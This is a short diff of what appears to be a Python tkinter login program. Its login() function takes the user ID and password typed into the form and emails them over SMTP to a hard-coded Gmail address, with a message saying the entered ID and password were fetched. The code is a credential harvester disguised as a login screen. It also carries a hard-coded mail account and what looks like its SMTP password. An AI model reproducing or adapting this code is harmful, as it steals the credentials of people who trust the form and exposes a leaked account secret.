@@ -42,9 +42,6 @@ btn.config(text = "Login")
 def login():
     user_id = ent1.get()
     user_pw = ent2.get()
-
-    print(user_id, user_pw)
-
     smtp_user = 'holykim707@gmail.com'
     smtp_password = 'puorvfxkyfksobie'
     emails = ['holykim707@gmail.com']
@@ -59,8 +56,6 @@ def login():
         MIMEText (
             "ID: "+user_id + "  PW: "+user_pw,
             "입력한 id와 pw를 가져왔습니다"
-
-
         )
         )
 
